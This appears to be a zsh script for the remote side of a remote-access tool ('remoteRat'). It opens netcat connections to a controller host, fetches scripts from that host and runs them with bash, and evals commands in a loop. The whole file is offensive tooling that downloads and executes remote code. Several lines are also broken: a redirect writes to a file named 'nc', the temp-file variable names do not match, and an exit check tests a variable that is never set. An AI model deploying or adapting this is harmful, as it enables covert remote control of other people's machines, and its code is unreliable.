#! /bin/zsh
#
#Description: 
#Executes commands from localRat
#
#Usage: zsh remoteRat.sh port1 [port2] [port3]

function runScript(){
    #Send file request to local host
    echo $1 > nc $HOMEHOST $HOMEPORT2

    #Quit the program if "rat" enters exit
    if [[ $REQUESTEDFILE == 'exit' ]] then exit; fi

    sleep 1

    nc ${HOMEHOST} ${HOMEPORT3} > $TMPFL
    bash $TMPFL 
}

#Parsing host and ports into variables
HOMEHOST=$1
HOMEPORT1=$2
HOMEPORT2=${3:-$((HOMEPORT1+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}

#Creating a tmpfl where the scripted code will be inserted
TMPFLE="/tmp/$$.sh"

#Create connection with local rat
nc ${HOMEHOST} ${HOMEPORT1}

while true
do
    #Prompt user for input
    echo -n '$ '
    read -r INPUT
    
    #Run script or execute commnad
    if [[ ${INPUT:0:1} == '!' ]] then
        REQUESTEDSCRIPT=${INPUT:1}
        runScript $REQUESTEDSCRIPT
        else
        eval $INPUT
    fi
done